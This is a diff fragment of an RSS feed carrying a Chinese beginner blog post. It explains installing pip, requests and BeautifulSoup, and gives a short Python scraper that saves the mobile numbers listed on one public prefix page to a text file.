+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ tar -xvf pip-19.2.2.tar.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;cd进去&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ &lt;span style=&#34;color:#007020&#34;&gt;cd&lt;/span&gt; ./pip-19.2.2
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;下面有一个 &lt;strong&gt;&lt;code&gt;setup.py&lt;/code&gt;&lt;/strong&gt; 文件，用python执行它即可&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo python setup.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;之后就会自动安装好pip了。&lt;/p&gt;
+&lt;h2 id=&#34;需要安装的模块&#34;&gt;需要安装的模块&lt;/h2&gt;
+&lt;p&gt;我的爬虫用到了以下模块：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;requests，网页请求模块&lt;/li&gt;
+&lt;li&gt;BeautifulSoup，分析模块&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;安装命令：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo pip install requests BeautifulSoup
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如果感觉到速度很慢，则参考&lt;a href=&#34;https://www.cnblogs.com/microman/p/6107879.html&#34;&gt;这里&lt;/a&gt;更换国内镜像源。&lt;/p&gt;
+&lt;h2 id=&#34;代码公开&#34;&gt;代码公开&lt;/h2&gt;
+&lt;p&gt;这里公开一下获取手机号的简单爬虫代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#0e84b5;font-weight:bold&#34;&gt;bs4&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;import&lt;/span&gt; BeautifulSoup
+&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#0e84b5;font-weight:bold&#34;&gt;requests&lt;/span&gt;
+&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;简易手机号码抓取工具 By WeepingDogel&amp;#34;&lt;/span&gt;)
+url&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;http://www.hiphop8.com/mobile/xian_1319339.html&amp;#34;&lt;/span&gt;
+page&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;requests&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;get(url)
+page_info&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;page&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;content
+soup &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; BeautifulSoup(page_info, &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;html.parser&amp;#34;&lt;/span&gt;)
+numbers &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; soup&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;find_all(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;1319339.txt&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;file&lt;/span&gt;:
+    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt; number &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;in&lt;/span&gt; numbers:
+        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;print&lt;/span&gt;(number&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;string)
+        &lt;span style=&#34;color:#007020&#34;&gt;file&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#007020&#34;&gt;str&lt;/span&gt;(number&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;string)&lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将代码复制到一个py文件中运行或修改即可。&lt;/p&gt;
+&lt;h2 id=&#34;最后&#34;&gt;最后&lt;/h2&gt;
+&lt;p&gt;写得比较仓促，所以可能不够详细，请谅解。&lt;del&gt;下方有评论区，欢迎评论(Tu Cao)。&lt;/del&gt;&lt;/p&gt;
+- https://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/ - 2019-2021 | WeepingDogel via CC-BY-NC 4.0</description>
         </item>
     
     
